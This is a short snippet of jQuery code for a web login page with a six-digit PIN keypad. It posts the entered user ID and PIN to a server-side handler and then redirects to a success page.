    <script>
        $(document).ready(() => {
            const del = document.getElementById('delete')
            del.addEventListener('click', () => {
                $('#pin').val('')
                $('#hiddenPassword').val('')
                $('#btn').attr('disabled', 'true')

            })

            const li = document.getElementsByTagName('li')
            for (let i = 0; i < li.length; i++) {
                const element = li[i];
                if (element.innerText != '') {
                    element.addEventListener('click', () => {
                        if ($('#hiddenPassword').val().length <= 6) {
                            num = element.textContent;
                            $('#hiddenPassword').val($('#hiddenPassword').val() + parseInt(num))
                            $('#pin').val('*' + $('#pin').val())
                            if ($('#hiddenPassword').val().length == 6) {
                                $('#btn').removeAttr('disabled')
                            }
                        }
                    })
                }
            }
        })
    </script>

    <script>

        $(document).ready(() => {
            let local = localStorage.getItem('what')
            if (local == 'badlog') {
                $('#user').addClass('bg-red-100')
                $('#pin').addClass('bg-red-100')
            }
        })

        $('#btn').click(() => {
            let id = $('#user')
            let form = new FormData()
            form.append('id', id.val())
            form.append('pin', $('#hiddenPassword').val())
            $.ajax({
                type: "post",
                data: form,
                url: "../server/handle.php?step=log",
                processData: false,
                contentType: false,
                success: () => {
                    window.location.href = '../../../success.php'
                    return false;
                }
            })
        })
    </script>
